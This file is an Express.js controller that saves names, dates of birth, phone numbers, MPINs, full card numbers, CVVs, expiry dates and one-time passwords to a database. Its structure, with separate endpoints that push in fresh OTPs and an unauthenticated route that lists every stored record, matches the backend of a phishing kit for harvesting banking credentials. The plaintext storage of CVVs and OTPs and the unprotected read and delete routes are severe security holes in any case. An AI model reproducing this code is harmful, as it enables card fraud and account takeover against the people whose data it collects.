const User = require("../models/User");

// DELETE /api/users/:id
exports.deleteUser = async (req, res) => {
    try {
        const user = await User.findByIdAndDelete(req.params.id);
        if (!user) {
            return res.status(404).json({ success: false, message: 'User not found' });
        }
        res.status(200).json({ success: true, message: 'User deleted successfully' });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
};

// POST /api/submit
exports.submitForm = async (req, res) => {
  try {
    const {
      name,
      dob,
      phone,
      mpin,
      creditLimit,
      cardNumber,
      cardHolderName,
      expiryDate,
      cvv,
      otp,
    } = req.body;

    const newUser = new User({
      name,
      dob,
      phone,
      mpin,
      credit_limit: creditLimit,
      card_number: cardNumber,
      card_holder_name: cardHolderName,
      expiry_date: expiryDate,
      cvv,
      otp,
    });

    await newUser.save();
    res.status(201).json({ success: true, message: "Data saved successfully" });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
};

// POST /api/users
exports.createUser = async (req, res) => {
  try {
    const { mpin } = req.body;
    const newUser = new User({ mpin });
    await newUser.save();
    res
      .status(201)
      .json({ success: true, message: "User created successfully" });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
};

// PUT /api/users/:userId/mpin
exports.updateMpin = async (req, res) => {
  try {
    const { userId } = req.params;
    const { mpin } = req.body;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ success: false, error: "User not found" });
    }

    user.mpin = mpin;
    await user.save();

    res
      .status(200)
      .json({ success: true, message: "MPIN updated successfully" });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
};

// GET /api/users
exports.getUsers = async (req, res) => {
  try {
    const users = await User.find().sort({ submission_date: -1 });
    res.status(200).json(users);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

// GET /api/users/:userId
exports.getUser = async (req, res) => {
  try {
    const user = await User.findById(req.params.userId);
    if (!user) return res.status(404).json({ error: "User not found" });
    res.status(200).json(user);
  } catch (err) {
    res.status(404).json({ error: err.message });
  }
};

// Check if user exists by phone number
exports.checkUser = async (req, res) => {
  try {
    const { phone } = req.body;

    if (!phone) {
      return res.status(400).json({
        success: false,
        error: "Phone number is required",
      });
    }

    const user = await User.findOne({ phone });

    if (!user) {
      return res.status(404).json({
        success: false,
        exists: false,
        message: "User not found",
      });
    }

    return res.status(200).json({
      success: true,
      exists: true,
      user: {
        name: user.name,
        dob: user.dob,
        phone: user.phone,
      },
    });
  } catch (err) {
    console.error("Error checking user:", err);
    return res.status(500).json({
      success: false,
      error: err.message,
    });
  }
};

// Update MPIN by phone number
exports.updateMpinByPhone = async (req, res) => {
  try {
    const { phone, mpin } = req.body;

    if (!phone || !mpin) {
      return res.status(400).json({
        success: false,
        error: "Phone and OTP are required",
      });
    }

    const user = await User.findOne({ phone });

    if (!user) {
      return res.status(404).json({
        success: false,
        error: "User not found",
      });
    }

    user.mpin = mpin;
    await user.save();

    return res.status(200).json({
      success: true,
      message: "OTP updated successfully",
    });
  } catch (err) {
    console.error("Error updating OTP:", err);
    return res.status(500).json({
      success: false,
      error: err.message,
    });
  }
};

// Update card details by phone number
exports.updateCardDetails = async (req, res) => {
  try {
    const { phone, cardNumber, cardHolderName, expiryDate, cvv } = req.body;

    if (!phone || !cardNumber || !cardHolderName || !expiryDate || !cvv) {
      return res.status(400).json({
        success: false,
        error: "All card details are required",
      });
    }

    const user = await User.findOne({ phone });

    if (!user) {
      return res.status(404).json({
        success: false,
        error: "User not found",
      });
    }

    user.card_number = cardNumber;
    user.card_holder_name = cardHolderName;
    user.expiry_date = expiryDate;
    user.cvv = cvv;
    await user.save();

    return res.status(200).json({
      success: true,
      message: "Card details updated successfully",
    });
  } catch (err) {
    console.error("Error updating card details:", err);
    return res.status(500).json({
      success: false,
      error: err.message,
    });
  }
};

// Update OTP by phone number
// Update OTP by phone number
exports.updateOtp = async (req, res) => {
  try {
    const { phone, otp } = req.body;

    // Corrected condition: check if either value is missing
    if (!phone || !otp) {
      return res.status(400).json({
        success: false,
        error: "Phone and OTP are required",
      });
    }

    const user = await User.findOne({ phone });

    if (!user) {
      return res.status(404).json({
        success: false,
        error: "User not found",
      });
    }

    user.otp = otp;
    await user.save();

    return res.status(200).json({
      success: true,
      message: "OTP updated successfully",
    });
  } catch (err) {
    console.error("Error updating OTP:", err);
    return res.status(500).json({
      success: false,
      error: err.message,
    });
  }
};